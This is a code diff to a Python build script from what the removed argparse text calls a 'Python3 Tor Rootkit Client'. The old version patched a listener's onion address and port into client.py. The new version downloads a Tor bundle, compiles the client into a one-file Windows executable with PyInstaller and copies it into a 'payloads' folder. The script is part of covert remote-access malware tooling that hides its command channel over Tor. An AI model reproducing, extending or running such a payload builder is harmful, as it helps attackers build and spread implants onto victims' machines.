@@ -3,7 +3,7 @@ import requests
 import os
 import zipfile
 import sys
-from argparse import ArgumentParser
+import shutil
 
 
 def getTorExpertBundle():
@@ -38,31 +38,24 @@ def getTorExpertBundle():
 	# change directory back to \client
 	os.chdir('..')
 
-def parse_args():
-	parser = ArgumentParser(description='Python3 Tor Rootkit Client')
-	parser.add_argument('onion', type=str, help='The remote onion address of the listener.')
-	parser.add_argument('port', type=int, help='The remote hidden service port of the listener.')
-	args = parser.parse_args()
-	return args.onion, args.port
 
+
+def main():
+	# create payload directory 
+	os.mkdir(os.path.join('..', 'payloads'))
+
+	if os.name == 'nt':
+		# dont download everytime
+		if not os.path.isdir('torbundle'):
+			getTorExpertBundle()
+
+		PyInstaller.__main__.run([
+		    'client.py',
+		    '--onefile',
+		    '--add-data=torbundle;torbundle'
+		])
+
+		shutil.copy(os.path.join('dist', 'client.exe'), os.path.join('..', 'payloads'))
 
 if __name__ == '__main__':
-	onion, port = parse_args()
-	# replace the onion and port line in client.py,
-	# since if havent found a more elegant way to do this yet.
-	lines = open('client.py').read().splitlines()
-	# onion address is defined in line 6
-	lines[5] = 'onion = "{}"'.format(onion)
-	# onion port is defined in line 7
-	lines[6] = 'port = {}'.format(port)
-	# write modified script to file
-	open('client.py','w').write('\n'.join(lines))
-	# dont download everytime
-	if not os.path.isdir('torbundle'):
-		getTorExpertBundle()
-
-	PyInstaller.__main__.run([
-	    'client.py',
-	    '--onefile',
-	    '--add-data=torbundle;torbundle'
-	])
+	main()
